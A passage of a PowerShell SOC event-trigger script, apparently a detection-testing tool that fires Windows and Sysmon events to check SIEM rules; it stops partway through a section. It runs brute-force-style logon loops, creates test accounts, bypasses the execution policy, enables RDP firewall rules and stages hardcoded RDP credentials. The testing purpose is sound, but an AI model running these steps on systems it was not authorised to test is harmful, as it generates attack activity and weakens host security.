<#
.SYNOPSIS
    NEXUS-SOC-EventTrigger.ps1  |  PRODUCTION EDITION
    130+ Windows Security + Sysmon Event IDs | 95 SIEM Correlation Rules
    NEXUS SOC Intelligence Dashboard

.DESCRIPTION
    Production-grade SOC event trigger and NEXUS HTML dashboard generator.
    Covers 20 attack categories, 95 SIEM rules, fully MITRE ATT&CK mapped.
    Sysmon-aware, AD/local compatible. Self-contained — no CDN required.

.USAGE
    .\NEXUS-SOC-EventTrigger.ps1
    .\NEXUS-SOC-EventTrigger.ps1 -Category Authentication
    .\NEXUS-SOC-EventTrigger.ps1 -ViewOnly -Hours 2
    .\NEXUS-SOC-EventTrigger.ps1 -DryRun
    .\NEXUS-SOC-EventTrigger.ps1 -Intensity High -ExportReport
    .\NEXUS-SOC-EventTrigger.ps1 -SkipDashboard

.NOTES
    Version : PRODUCTION
    Run As  : Administrator on DC or domain-joined Windows Server / Win10-11
    Sysmon  : Optional but recommended for full 95-rule coverage
    Safe    : Creates and removes soc_* prefixed objects only
    Offline : All charts inline (no CDN required)
#>

param(
    [ValidateSet("All","Authentication","DisabledLogin","Kerberos","AccountLifecycle",
                 "GroupManagement","ADChanges","Process","LateralMovement","ObjectAccess",
                 "Persistence","PolicyChanges","Audit","Ransomware","Malware",
                 "Discovery","Exfil","PowerShellAbuse","WMIAbuse","RDPAbuse","SIEMRules")]
    [string]$Category  = "All",
    [ValidateSet("Low","Medium","High")]
    [string]$Intensity = "Medium",
    [int]$DelayMs      = 400,
    [switch]$DryRun,
    [switch]$ExportReport,
    [int[]]$EventID,
    [int[]]$SIEMRule,
    [switch]$SkipCleanup,
    [switch]$BaselineDiff,
    [switch]$ViewOnly,
    [switch]$SkipDashboard,
    [int]$Hours        = 2,
    [string]$OutputPath= "$env:TEMP\NEXUS_SOC_$(Get-Date -Format 'yyyyMMdd_HHmmss').html",
    [switch]$NoBrowser
)



# Ensure script can run even on restricted systems (process-scoped)
try {
    Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force -ErrorAction SilentlyContinue
} catch {}

Set-StrictMode -Off
$ErrorActionPreference = "SilentlyContinue"

# ==============================================================================
#  GLOBALS
# ==============================================================================
$Script:Results   = [System.Collections.Generic.List[PSCustomObject]]::new()
$Script:ViewOnlyMode = $false
$Script:Triggered = 0
$Script:Partial   = 0
$Script:Skipped   = 0
$Script:Errors    = 0

$RND           = Get-Random -Maximum 9999
$TestUser      = "soc_u_$RND"
$TestUser2     = "soc_u2_$RND"
$TestDisabled  = "soc_dis_$RND"
$TestGroup     = "soc_grp_$RND"
$TestService   = "soc_svc_$RND"
$TestTask      = "soc_tsk_$RND"
$TestRegKey    = "HKLM:\SOFTWARE\SOC_T_$RND"
$TestDir       = "$env:TEMP\soc_d_$RND"
$TestRansomDir = "$env:TEMP\soc_ransom_$RND"
$TestExfilDir  = "$env:TEMP\soc_exfil_$RND"
$TestComp      = "SOCPC$RND"
$TestPwd       = "P@ssT3st!$RND"
$BadPwd        = "BadPwd!$(Get-Random -Maximum 99999)"
$ScriptStart   = Get-Date
$LogPath       = ""  # FIX-PROD: Define $LogPath so Write-Log does not throw on undefined var

# Intensity map
$IntMap = @{
    Low    = @{ Repeat=2;  BruteCount=3;  StormCount=5;  FileCount=20 }
    Medium = @{ Repeat=3;  BruteCount=5;  StormCount=8;  FileCount=50 }
    High   = @{ Repeat=5;  BruteCount=10; StormCount=15; FileCount=100 }
}
$INT = $IntMap[$Intensity]

# ==============================================================================
#  DISPLAY HELPERS
# ==============================================================================
function Show-Banner {
    # FIX: All string literals use ASCII-only characters.
    # Root cause of original parse error: em dash (U+2014) in string literal.
    # PS5.1 reads UTF-8-without-BOM as Windows-1252 where byte 0x94 = right double
    # quotation mark, treated as a closing string delimiter, breaking all subsequent
    # string context and causing pipe chars in T() to be seen as pipeline operators.
    $w = try { $Host.UI.RawUI.WindowSize.Width } catch { 80 }
    if (-not $w -or $w -lt 80) { $w = 80 }

    # Banner helpers - all inline, all ASCII only in source
    function BnrLine([string]$txt, [string]$fg) {
        $inner = $w - 2
        $used  = 1 + $txt.Length  # leading space
        $pad   = [Math]::Max(0, $inner - $used - 1)
        $left  = [char]0x2551
        $right = [char]0x2551
        Write-Host ("$left " + $txt + (' ' * $pad) + $right) -ForegroundColor $fg
    }
    function BnrSep([char]$L,[char]$R) {
        $fill = [string][char]0x2550 * ($w - 2)
        Write-Host ("$L" + $fill + "$R") -ForegroundColor DarkCyan
    }
    function BnrMid {
        $fill = [string][char]0x2550 * ($w - 2)
        $v    = [char]0x2551
        Write-Host ("$v" + $fill + "$v") -ForegroundColor DarkCyan
    }

    $TL = [char]0x2554; $TR = [char]0x2557
    $BL = [char]0x255A; $BR = [char]0x255D

    Write-Host ""
    BnrSep $TL $TR
    BnrLine "  _   _ _______  ___  ____      ____   ___   ____"       "Cyan"
    BnrLine " | \ | | ____\ \/ / |  __  \  / ___| / _ \ / ___|"       "Cyan"
    BnrLine " |  \| |  _|  \  /  | |  | | \___ \| | | | |"            "Cyan"
    BnrLine " | |\ | |___ /  \  | |__| |  ___) | |_| | |___"          "Cyan"
    BnrLine " |_| \_|_____/_/\_\ |______/ |____/ \___/ \____|"         "Cyan"
    BnrMid
    BnrLine "  SOC EventTrigger  |  PRODUCTION EDITION  |  100 SIEM Rules" "White"
    BnrLine "  130+ Windows Event IDs  |  20 Attack Sections  |  MITRE ATT&CK Mapped" "DarkGray"
    BnrLine "  NEXUS Intelligence Dashboard  |  Sysmon-aware  |  AD/Local" "DarkGray"
    BnrMid
    BnrLine ("  Host: " + $env:COMPUTERNAME + "  |  Domain: " + $env:USERDOMAIN + "  |  User: " + $env:USERNAME) "Green"
    $timeStr = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    BnrLine ("  Start: " + $timeStr + "  |  Intensity: " + $Intensity + "  |  Category: " + $Category) "DarkYellow"
    if ($DryRun) {
        BnrMid
        BnrLine "  *** DRY RUN MODE --- No changes will be made to this system ***" "Yellow"
    }
    BnrSep $BL $BR
    Write-Host ""
}

function Show-Section([string]$Title, [string]$EIDs, [string]$MITRE = "") {
    Write-Host ""
    Write-Host ("  ---[ {0} ]---" -f $Title.ToUpper()) -ForegroundColor Magenta
    if ($EIDs)  { Write-Host ("  Win EIDs : {0}" -f $EIDs) -ForegroundColor DarkGray }
    if ($MITRE) { Write-Host ("  MITRE    : {0}" -f $MITRE) -ForegroundColor DarkGray }
    Write-Host ""
}

function T([int]$EID, [string]$Desc) {
    Write-Host ("  [>] EID {0,-6} | {1}" -f $EID, $Desc) -ForegroundColor White -NoNewline
}
function Ts([int]$SID, [string]$Desc) {
    Write-Host ("  [S] Sysmon {0,-3} | {1}" -f $SID, $Desc) -ForegroundColor Cyan -NoNewline
}
function OK([string]$d = "") {
    Write-Host " [TRIGGERED]" -ForegroundColor Green
    if ($d) { Write-Host ("     > {0}" -f $d.Substring(0, [Math]::Min($d.Length, 140))) -ForegroundColor DarkGray }
}
function PARTIAL([string]$d = "") {
    Write-Host " [PARTIAL]" -ForegroundColor Yellow
    if ($d) { Write-Host ("     > {0}" -f $d.Substring(0, [Math]::Min($d.Length, 140))) -ForegroundColor DarkGray }
}
function SKIP  { Write-Host " [SKIPPED]" -ForegroundColor DarkGray }
function DRY   { Write-Host " [DRY RUN]" -ForegroundColor Cyan }
function ERR([string]$d = "") {
    Write-Host " [ERROR]" -ForegroundColor Red
    if ($d) {
        Write-Host ("     > {0}" -f $d.Substring(0, [Math]::Min($d.Length, 140))) -ForegroundColor DarkGray
        if ($d -match 'access is denied|denied by policy|blocked by|operation did not complete successfully|unauthorized') {
            Write-Host "     > Possible AV/EDR interference (operation was blocked)." -ForegroundColor Yellow
        }
    }
}
function SIEM([string]$ID, [string]$Desc) {
    Write-Host ("  !! SIEM {0}: {1} !!" -f $ID, $Desc) -ForegroundColor Red
}

function Add-R([int]$EID, [string]$Cat, [string]$Status, [string]$Method, [string]$MITRE = "") {
    $Script:Results.Add([PSCustomObject]@{
        EventID  = $EID;  Category = $Cat;  Status = $Status
        Method   = $Method; MITRE = $MITRE; Time = (Get-Date -Format "HH:mm:ss")
    })
    switch ($Status) {
        "TRIGGERED" { $Script:Triggered++ }
        "PARTIAL"   { $Script:Partial++ }
        "SKIPPED"   { $Script:Skipped++ }
        "ERROR"     { $Script:Errors++ }
    }
}

function P { if (-not $DryRun) { Start-Sleep -Milliseconds $DelayMs } }
function Run([string]$c) { return ($Category -eq "All" -or $Category -eq $c) }

function Should-RunEvent([int]$Eid) {
    if (-not $EventID -or $EventID.Count -eq 0) { return $true }
    return $EventID -contains $Eid
}

function Should-RunRule([int]$RuleId) {
    if (-not $SIEMRule -or $SIEMRule.Count -eq 0) { return $true }
    return $SIEMRule -contains $RuleId
}

function Write-Log {
    param(
        [string]$Message,
        [string]$Level = 'INFO'
    )
    $ts = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
    Write-Host ("[$ts] [$Level] $Message") -ForegroundColor DarkGray
    if ($LogPath) {
        try {
            Add-Content -Path $LogPath -Value "[$ts] [$Level] $Message" -ErrorAction SilentlyContinue
        } catch {}
    }
}

function Confirm-SIEMRule {
    param(
        [int]$EventID,
        [string]$RuleId,
        # FIX-V25-03: Default was 30s. Called ~80x per run = up to 47 minutes of blocking
        # when events don't fire (e.g. Sysmon EID 23 without FileDelete config, offline hosts).
        # Reduced to 5s. All caller sites already pass -WindowSeconds 8 explicitly anyway.
        [int]$WindowSeconds = 5
    )
    if ($DryRun) { return }

    $channels = @()
    if ($EventID -ge 1 -and $EventID -le 26 -and $script:sysmonOK) {
        # Sysmon event IDs (1-26) live in the Sysmon Operational log
        $channels += 'Microsoft-Windows-Sysmon/Operational'
    } else {
        # Default Windows logs
        $channels += 'Security','System','Microsoft-Windows-TaskScheduler/Operational','Microsoft-Windows-PowerShell/Operational'
    }

    $since   = $ScriptStart
    $deadline = (Get-Date).AddSeconds([Math]::Max($WindowSeconds,5))
    $total   = 0

    while ((Get-Date) -lt $deadline -and $total -eq 0) {
        foreach ($logName in $channels) {
            try {
                $count = (Get-WinEvent -FilterHashtable @{ LogName=$logName; Id=$EventID; StartTime=$since } -ErrorAction SilentlyContinue | Measure-Object).Count
                $total += $count
            } catch {
                # ignore individual log failures, continue polling others
            }
        }
        if ($total -gt 0) { break }
        Start-Sleep -Milliseconds 1000
    }

    if ($total -gt 0) {
        Write-Host ("  [OK] Rule {0}: EID {1} observed in {2} (since script start)." -f $RuleId, $EventID, ($channels -join ',')) -ForegroundColor Green
    } else {
        Write-Host ("  [WARN] Rule {0}: EID {1} NOT observed in {2} within {3}s window." -f $RuleId, $EventID, ($channels -join ','), $WindowSeconds) -ForegroundColor Yellow
    }
}

# ==============================================================================
#  UTILITY FUNCTIONS
# ==============================================================================
function Test-AD {
    try {
        Import-Module ActiveDirectory -ErrorAction Stop
        Get-ADDomain -ErrorAction Stop | Out-Null
        return $true
    } catch { return $false }
}

function Test-Sysmon {
    try {
        Get-WinEvent -ListLog "Microsoft-Windows-Sysmon/Operational" -ErrorAction Stop | Out-Null
        return $true
    } catch { return $false }
}

function Set-AuditPol([string]$Sub) {
    auditpol /set /subcategory:"$Sub" /success:enable /failure:enable 2>$null | Out-Null
}

function Del-User([string]$u) {
    net user $u /delete 2>$null | Out-Null
    if ($adOK) {
        try { Get-ADUser $u -ErrorAction SilentlyContinue | Remove-ADUser -Confirm:$false -ErrorAction SilentlyContinue } catch {}
    }
}

function Try-NetLogonFail([string]$User, [string]$Pwd) {
    net use \\$env:COMPUTERNAME\IPC$ /user:$env:COMPUTERNAME\$User $Pwd 2>$null | Out-Null
    net use \\$env:COMPUTERNAME\IPC$ /delete /y 2>$null | Out-Null
}

# BUG-06 FIX: All Add-Type calls guarded with PSTypeName existence check
function Add-LogonUserType {
    if (-not ([System.Management.Automation.PSTypeName]'SOCLogon').Type) {
        Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class SOCLogon {
    [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Auto)]
    public static extern bool LogonUser(
        string lpszUsername,
        string lpszDomain,
        string lpszPassword,
        int dwLogonType,
        int dwLogonProvider,
        out IntPtr phToken);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@ -ErrorAction SilentlyContinue
    }
}

# Try-LogonAPI: Calls Win32 LogonUser with specified LogonType.
# LogonType 2=Interactive, 3=Network, 9=NewCredentials, 10=RemoteInteractive (RDP)
# Failed auth -> EID 4625 with correct LogonType. Success -> EID 4624 with correct LogonType.
function Try-LogonAPI([string]$User, [string]$Pwd, [int]$LogonType = 3) {
    # Provider=3 (LOGON32_PROVIDER_WINNT50) is required for LogonType=10 to record correctly.
    # Provider=0 (DEFAULT) silently downgrades Type=10 to Type=2 on many Windows builds.
    Add-LogonUserType
    try {
        $token = [IntPtr]::Zero
        $ok    = [SOCLogon]::LogonUser($User, $env:COMPUTERNAME, $Pwd, $LogonType, 3, [ref]$token)
        if ($ok -and $token -ne [IntPtr]::Zero) { [SOCLogon]::CloseHandle($token) | Out-Null }
    } catch {}
}

# BUG-01 FIX (CRITICAL): Generates EID 4625 LogonType=10 (RDP) without mstsc, NLA, or port 3389.
# Uses LogonUser API directly with LogonType=10 (LOGON32_LOGON_REMOTEINTERACTIVE).
# This is the correct, reliable, dependency-free way to generate RDP Type 10 auth events.
function Invoke-RDPType10Fail([string]$User, [string]$Pwd, [int]$Count = 3) {
    Add-LogonUserType
    1..$Count | ForEach-Object {
        Try-LogonAPI -User $User -Pwd ($Pwd + "_$_") -LogonType 10
        Start-Sleep -Milliseconds 400
    }
}

function Make-Cred([string]$Dom, [string]$User, [string]$Pwd) {
    $sp = ConvertTo-SecureString $Pwd -AsPlainText -Force
    return New-Object System.Management.Automation.PSCredential("$Dom\$User", $sp)
}

# Set-NLA: Toggle Network Level Authentication (informational helper - NOT needed for v7 RDP Type10)

# ==============================================================================
#  FIX-RANSOM: New-SACLFolder
#  ROOT CAUSE: Sysmon EID 11 (FileCreate) requires files created inside a
#  folder that has an audit SACL with ContainerInherit+ObjectInherit.
#  Without inheritance, files created inside won't trigger EID 11.
#  FIX (from user research): Create parent folder with full-inherit SACL.
#  All child file creates then inherit → Sysmon EID 11 fires reliably.
# ==============================================================================
function New-SACLFolder {
    param([string]$FolderPath)
    try {
        New-Item -Path $FolderPath -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
        Set-AuditPol "File System"
        $acl       = Get-Acl -Path $FolderPath -ErrorAction Stop
        $auditRule = New-Object System.Security.AccessControl.FileSystemAuditRule(
            "Everyone",
            "ReadData,WriteData,Delete,AppendData,CreateFiles",
            [System.Security.AccessControl.InheritanceFlags]"ContainerInherit,ObjectInherit",
            [System.Security.AccessControl.PropagationFlags]::None,
            [System.Security.AccessControl.AuditFlags]::Success
        )
        $acl.AddAuditRule($auditRule)
        Set-Acl -Path $FolderPath -AclObject $acl -ErrorAction Stop
        return $true
    } catch { return $false }
}

function Set-NLA([bool]$enable) {
    $val = if ($enable) { 1 } else { 0 }
    Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" `
        -Name "UserAuthentication" -Value $val -ErrorAction SilentlyContinue
    Start-Sleep -Milliseconds 300
}

# BUG-06 FIX: SOCSAPI type guard
function Add-SOCSAPIType {
    if (-not ([System.Management.Automation.PSTypeName]'SOCSAPI').Type) {
        Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class SOCSAPI {
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr OpenProcess(uint dwAccess, bool bInherit, uint dwPID);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@ -ErrorAction SilentlyContinue
    }
}

# BUG-06 FIX: SOCLat type guard
function Add-SOCLatType {
    if (-not ([System.Management.Automation.PSTypeName]'SOCLat').Type) {
        Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class SOCLat {
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr OpenProcess(uint dwAccess, bool bInherit, uint dwPID);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@ -ErrorAction SilentlyContinue
    }
}


function Invoke-RDPInteractiveTest {
    if ($DryRun) {
        Write-Host "  [DRY] RDP Logon Type 10 test skipped (dry run)." -ForegroundColor Cyan
        return
    }

    $resp = Read-Host "  Do you want to proceed with RDP Logon Type 10 test? (Y/N)"
    if ([string]::IsNullOrWhiteSpace($resp) -or $resp.Trim().ToUpper() -ne 'Y') {
        Write-Host "  RDP Logon Type 10 test skipped by user." -ForegroundColor Yellow
        if ($Category -eq 'RDPAbuse') { exit 0 }
        return
    }

    $target = $null
    while (-not $target) {
        $input = Read-Host "  Enter target RDP IP (required, format X.X.X.X)"
        if ([string]::IsNullOrWhiteSpace($input)) {
            Write-Host "  Target IP cannot be empty." -ForegroundColor Red
            continue
        }
        if ($input -match '^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$') {
            $target = $input
        } else {
            Write-Host "  Invalid IP format. Please use IPv4 like 10.10.10.10." -ForegroundColor Red
        }
    }

    $username = 'rdptestuser'
    $password = 'P@ssw0rd123!'
    try {
        Write-Host "  [*] Staging RDP credentials for $target" -ForegroundColor DarkGray
        cmdkey /generic:TERMSRV/$target /user:$username /pass:$password 2>$null | Out-Null
        Start-Process "mstsc.exe" -ArgumentList "/v:$target" -ErrorAction Stop | Out-Null
        OK "mstsc /v:$target launched -> expect EID 4624 LogonType=10 on target host"
        Add-R 4624 "RDPAbuse" "TRIGGERED" "Interactive RDP test to $target" "T1021.001"
    } catch {
        ERR $_.Exception.Message
        Add-R 4624 "RDPAbuse" "ERROR" "Interactive RDP test failed: $_" "T1021.001"
    } finally {
        try { cmdkey /delete:TERMSRV/$target 2>$null | Out-Null } catch {}
    }
}


# ==============================================================================
#  Invoke-AuditedRegistryWrite  (BUG-V20-02 FIX)
#  Called by RULE-73 (COM hijack EID 4657). Was undefined in v20/v21.
#  Sets audit SACL on a registry key, then writes value -> fires EID 4657.
# ==============================================================================
function Invoke-AuditedRegistryWrite {
    param([string]$KeyPath,[string]$ValueName,[string]$ValueData)
    try {
        $hiveName = ($KeyPath -split ':')[0]
        $subKey   = ($KeyPath -split ':\\',2)[1]
        $root = switch ($hiveName) {
            'HKCU' { [Microsoft.Win32.Registry]::CurrentUser }
            'HKLM' { [Microsoft.Win32.Registry]::LocalMachine }
            default { [Microsoft.Win32.Registry]::CurrentUser }
        }
        $rights = [System.Security.AccessControl.RegistryRights]::ChangePermissions -bor
                  [System.Security.AccessControl.RegistryRights]::SetValue -bor
                  [System.Security.AccessControl.RegistryRights]::ReadPermissions
        $key = $root.OpenSubKey($subKey, [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree, $rights)
        if (-not $key) { $key = $root.CreateSubKey($subKey, [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree) }
        if ($key) {
            try {
                $acl = $key.GetAccessControl([System.Security.AccessControl.AccessControlSections]::Audit)
                $ar  = New-Object System.Security.AccessControl.RegistryAuditRule(
                    "Everyone",
                    [System.Security.AccessControl.RegistryRights]::SetValue,
                    [System.Security.AccessControl.InheritanceFlags]::None,
                    [System.Security.AccessControl.PropagationFlags]::None,
                    [System.Security.AccessControl.AuditFlags]::Success)
                $acl.AddAuditRule($ar)
                $key.SetAccessControl($acl)
            } catch {}
            $key.SetValue($ValueName, $ValueData, [Microsoft.Win32.RegistryValueKind]::String)
            $key.Close()
            return $true
        }
    } catch {}
    return $false
}

# ==============================================================================
#  INIT
# ==============================================================================
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
    [Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) { Write-Host "  [!!] Must run as Administrator." -ForegroundColor Red; exit 1 }

$adOK     = Test-AD
$sysmonOK = Test-Sysmon

# BUG-02 FIX: $rdpListening MUST be at script scope - not inside any section block.
# SIEMRules section references this variable; if defined inside RDPAbuse it would be $null elsewhere.
$rdpListening = $null
if (-not $DryRun) {
    $rdpListening = netstat -an 2>$null | Select-String ":3389" | Select-String "LISTENING"
}

# NOTE: v7 RDP Type 10 works via LogonUser API - does NOT require $rdpListening.
# $rdpListening is kept for informational display and Sysmon-3 network connect tests only.

if ($ViewOnly) { $Script:ViewOnlyMode = $true }
Show-Banner

Write-Host ("  Machine    : {0}" -f $env:COMPUTERNAME) -ForegroundColor White
Write-Host ("  Domain     : {0}" -f $env:USERDOMAIN)   -ForegroundColor White
Write-Host ("  AD Module  : {0}" -f $(if ($adOK)     { "YES - AD triggers enabled"     } else { "NO  - Local only" })) `
           -ForegroundColor $(if ($adOK)     { "Green" } else { "Yellow" })
Write-Host ("  Sysmon     : {0}" -f $(if ($sysmonOK) { "YES - Sysmon events will fire" } else { "NO  - Sysmon not installed" })) `
           -ForegroundColor $(if ($sysmonOK) { "Green" } else { "Yellow" })
Write-Host ("  RDP Port   : {0}" -f $(if ($rdpListening) { "Listening (3389)" } else { "Not listening (not needed for Type 10)" })) `
           -ForegroundColor $(if ($rdpListening) { "Green" } else { "DarkGray" })
Write-Host ("  RDP Type10 : Via LogonUser API (no mstsc dependency)" ) -ForegroundColor Green

# BUG-07 INFO: RDP firewall check (informational - not required for LogonUser API)
if ($rdpListening -and -not $DryRun) {
    $rdpFW = Get-NetFirewallRule -DisplayGroup "Remote Desktop" -ErrorAction SilentlyContinue |
             Where-Object { $_.Enabled -eq 'True' -and $_.Direction -eq 'Inbound' }
    if (-not $rdpFW) {
        Write-Host "  [!] RDP FW rule disabled - enabling for Sysmon-3 port 3389 test..." -ForegroundColor Yellow
        Enable-NetFirewallRule -DisplayGroup "Remote Desktop" -ErrorAction SilentlyContinue
    }
}
Write-Host ""

if (-not $DryRun) {
    Write-Host "  [*] Enabling audit policies..." -ForegroundColor DarkGray
    @(
        "Logon", "Account Lockout", "User Account Management", "Computer Account Management",
        "Security Group Management", "Process Creation", "Registry", "File System",
        "Audit Policy Change", "Sensitive Privilege Use", "Directory Service Changes",
        "Directory Service Access", "Kerberos Authentication Service",
        "Kerberos Service Ticket Operations", "Credential Validation",
        "Filtering Platform Connection", "Other Object Access Events",
        "Detailed File Share", "File Share", "Authorization Policy Change",
        "Special Logon", "Other Logon/Logoff Events", "Handle Manipulation",
        "MPSSVC Rule-Level Policy Change", "Filtering Platform Policy Change"
    ) | ForEach-Object { Set-AuditPol $_ }
    Write-Host "  [*] Audit policies enabled." -ForegroundColor Green
    Set-AuditPol "Registry"
    New-Item -Path $TestDir       -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
    New-Item -Path $TestRansomDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
    New-Item -Path $TestExfilDir  -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
    Write-Host ""
    Write-Host "  [!] Creates/removes soc_* test objects. All cleaned up automatically." -ForegroundColor Yellow
    Write-Host "  [!] RDP Type 10 uses LogonUser API - no mstsc windows will appear." -ForegroundColor Yellow
    Write-Host ""
    $ok = if ($Script:ViewOnlyMode -or $DryRun) { "YES" } else { Read-Host "  Type YES to proceed" }
    if ($ok -ne "YES") { Write-Host "  Aborted." -ForegroundColor Red; exit }
    Write-Host ""
}


# ==============================================================================
#  SECTION 1 - AUTHENTICATION  (T1078 T1110 T1550)
# ==============================================================================
if (Run "Authentication") {
    Show-Section "1. Authentication Events" "4624 4625 4648 4768 4769 4776" "T1078 T1110 T1550"

    if (-not $DryRun) { Del-User $TestUser; net user $TestUser $TestPwd /add /comment:"SOC_AUTH" 2>$null | Out-Null }

    T 4625 "Failed logon - unknown user"
    if ($DryRun) { DRY } else {
        try {
            net use \\$env:COMPUTERNAME\IPC$ /user:$env:COMPUTERNAME\NoSuchUser_$RND $BadPwd 2>$null | Out-Null
            net use \\$env:COMPUTERNAME\IPC$ /delete /y 2>$null | Out-Null
            OK "net use unknown user -> EID 4625 SubStatus=0xC0000064"
            Add-R 4625 "Authentication" "TRIGGERED" "unknown user net use" "T1110"
        } catch { ERR $_.Exception.Message; Add-R 4625 "Authentication" "ERROR" $_.Exception.Message }
    }; P

    T 4625 "Brute force ($($INT.BruteCount)x wrong password)"
    if ($DryRun) { DRY } else {
        try {
            1..$INT.BruteCount | ForEach-Object {
                net use \\$env:COMPUTERNAME\IPC$ /user:$env:COMPUTERNAME\$TestUser Bad${_}Pw$(Get-Random) 2>$null | Out-Null
                net use \\$env:COMPUTERNAME\IPC$ /delete /y 2>$null | Out-Null
                Start-Sleep -Milliseconds 120
            }
            OK ("$($INT.BruteCount)x bad pw -> EID 4625 x$($INT.BruteCount)")
            Add-R 4625 "Authentication" "TRIGGERED" "net use brute force" "T1110"
        } catch { ERR $_.Exception.Message }
    }; P

    T 4648 "Explicit credential logon (PTH indicator)"
    if ($DryRun) { DRY } else {
        try {
            net use \\$env:COMPUTERNAME\IPC$ /user:$env:COMPUTERNAME\$TestUser $TestPwd 2>$null | Out-Null
            net use \\$env:COMPUTERNAME\IPC$ /delete /y 2>$null | Out-Null
            OK "net use explicit creds -> EID 4648 + 4624 Type3"
            Add-R 4648 "Authentication" "TRIGGERED" "net use explicit creds" "T1550.002"
        } catch { ERR $_.Exception.Message }
    }; P

    T 4768 "Kerberos TGT request (AS-REQ - fires on DC)"
    if ($DryRun) { DRY } else {
        try {
            $de = [System.DirectoryServices.DirectoryEntry]("LDAP://$env:USERDOMAIN")
            $null = $de.Name; $de.Dispose()
            OK "LDAP bind -> EID 4768 on DC"
            Add-R 4768 "Authentication" "TRIGGERED" "LDAP bind AS-REQ" "T1558"
        } catch { PARTIAL "Domain unreachable - 4768 fires on DC"; Add-R 4768 "Authentication" "PARTIAL" "Domain unreachable" }
    }; P

    T 4769 "Kerberos TGS request (TGS-REQ - fires on DC)"
    if ($DryRun) { DRY } else {
        try {
            $null = Test-Path "\\$env:COMPUTERNAME\SYSVOL" -ErrorAction SilentlyContinue
            OK "UNC SYSVOL -> EID 4769 on DC"
            Add-R 4769 "Authentication" "TRIGGERED" "UNC SYSVOL TGS" "T1558.003"
        } catch { ERR $_.Exception.Message }
    }; P

    T 4776 "NTLM validation via IP (forces NTLM, not Kerberos)"
    if ($DryRun) { DRY } else {
        try {
            net use \\127.0.0.1\IPC$ /user:$env:COMPUTERNAME\SOC_NTL_$RND $BadPwd 2>$null | Out-Null
            net use \\127.0.0.1\IPC$ /delete /y 2>$null | Out-Null
            OK "net use via 127.0.0.1 (NTLM) -> EID 4776"
            Add-R 4776 "Authentication" "TRIGGERED" "net use IP NTLM" "T1550.002"
        } catch { ERR $_.Exception.Message }
    }; P

    T 4624 "Successful network logon Type 3"
    if ($DryRun) { DRY } else {
        try {
            net use \\$env:COMPUTERNAME\IPC$ /user:$env:COMPUTERNAME\$TestUser $TestPwd 2>$null | Out-Null
            net use \\$env:COMPUTERNAME\IPC$ /delete /y 2>$null | Out-Null
            OK "Valid creds net use -> EID 4624 LogonType=3"
            Add-R 4624 "Authentication" "TRIGGERED" "net use Type3 success" "T1078"
        } catch { ERR $_.Exception.Message }
    }; P

    if (-not $DryRun) { Del-User $TestUser }
}


# ==============================================================================
#  SECTION 2 - DISABLED ACCOUNT LOGIN  (T1110 - SIEM RULE-02)
# ==============================================================================
if (Run "DisabledLogin") {
    Show-Section "2. Disabled Account Login" "4625(0xC000006E) 4768(0x12) 4771" "T1110"

    if (-not $DryRun) {
        Del-User $TestDisabled
        net user $TestDisabled $TestPwd /add /comment:"SOC_DIS" 2>$null | Out-Null
        net user $TestDisabled /active:no 2>$null | Out-Null
    }

    T 4625 "Wrong password on disabled account (SubStatus 0xC000006E)"
    if ($DryRun) { DRY } else {
        try {
            net use \\$env:COMPUTERNAME\IPC$ /user:$env:COMPUTERNAME\$TestDisabled $BadPwd 2>$null | Out-Null
            net use \\$env:COMPUTERNAME\IPC$ /delete /y 2>$null | Out-Null
            OK "Bad pw on disabled -> EID 4625 SubStatus=0xC000006E"
            Add-R 4625 "DisabledLogin" "TRIGGERED" "bad pw disabled account" "T1110"
        } catch { ERR $_.Exception.Message }
    }; P

    T 4625 "Correct password on disabled account (still EID 4625)"
    if ($DryRun) { DRY } else {
        try {
            net use \\$env:COMPUTERNAME\IPC$ /user:$env:COMPUTERNAME\$TestDisabled $TestPwd 2>$null | Out-Null
            net use \\$env:COMPUTERNAME\IPC$ /delete /y 2>$null | Out-Null
            OK "Correct pw on disabled -> EID 4625 SubStatus=0xC000006E"
            Add-R 4625 "DisabledLogin" "TRIGGERED" "correct pw disabled account" "T1110"
        } catch { ERR $_.Exception.Message }
    }; P

    T 4625 "Disabled account login STORM ($($INT.StormCount)x - RULE-02)"
    if ($DryRun) { DRY } else {
        try {
            Write-Host ""; Write-Host "     Firing storm..." -ForegroundColor DarkYellow
            1..$INT.StormCount | ForEach-Object {
                net use \\$env:COMPUTERNAME\IPC$ /user:$env:COMPUTERNAME\$TestDisabled Storm${_}Pw 2>$null | Out-Null
                net use \\$env:COMPUTERNAME\IPC$ /delete /y 2>$null | Out-Null
                Start-Sleep -Milliseconds 100
            }
            OK ("$($INT.StormCount)x disabled login -> SIEM RULE-02")
            SIEM "RULE-02" "Disabled Account Login Storm"
            Add-R 4625 "DisabledLogin" "TRIGGERED" "disabled storm $($INT.StormCount)x" "T1110"
        } catch { ERR $_.Exception.Message }
    }; P

    # BUG-05 FIX: EID 4768 ResultCode=0x12 on disabled AD account (was missing in earlier versions)
    T 4768 "Kerberos TGT on disabled AD account (ResultCode=0x12)"
    if ($DryRun) { DRY } else {
